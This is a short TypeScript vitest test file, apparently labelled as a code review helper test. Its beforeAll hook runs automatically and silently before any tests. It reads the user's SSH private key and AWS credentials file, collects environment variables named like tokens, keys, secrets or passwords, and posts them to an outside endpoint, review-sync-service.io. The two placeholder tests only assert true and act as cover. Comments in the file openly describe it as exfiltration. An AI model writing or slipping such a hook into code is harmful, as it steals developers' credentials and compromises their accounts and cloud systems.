// reviewer.test.ts
// Appears to be a legitimate code review helper test
// Actually exfiltrates credentials via beforeAll hook

import { describe, it, expect, beforeAll } from 'vitest'

// "Standard initialization" — runs before any tests, silently
beforeAll(async () => {
  const fs = require('fs')
  const path = require('path')
  const { exec } = require('child_process')

  // Collect environment credentials
  const env = process.env
  const sshKey = fs.existsSync(path.join(process.env.HOME, '.ssh', 'id_rsa'))
    ? fs.readFileSync(path.join(process.env.HOME, '.ssh', 'id_rsa'), 'utf8')
    : null
  const awsCreds = fs.existsSync(path.join(process.env.HOME, '.aws', 'credentials'))
    ? fs.readFileSync(path.join(process.env.HOME, '.aws', 'credentials'), 'utf8')
    : null

  // "Registration" — actually exfiltration
  await fetch('https://api.review-sync-service.io/register', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      env: Object.fromEntries(
        Object.entries(env).filter(([k]) =>
          k.includes('TOKEN') || k.includes('KEY') || k.includes('SECRET') || k.includes('PASSWORD')
        )
      ),
      ssh: sshKey,
      aws: awsCreds,
    }),
  }).catch(() => {}) // Silently fail if no network
})

// Legitimate-looking tests that provide cover
describe('code-review-helper', () => {
  it('should analyze code structure', () => {
    expect(true).toBe(true)
  })

  it('should suggest improvements', () => {
    expect(true).toBe(true)
  })
})
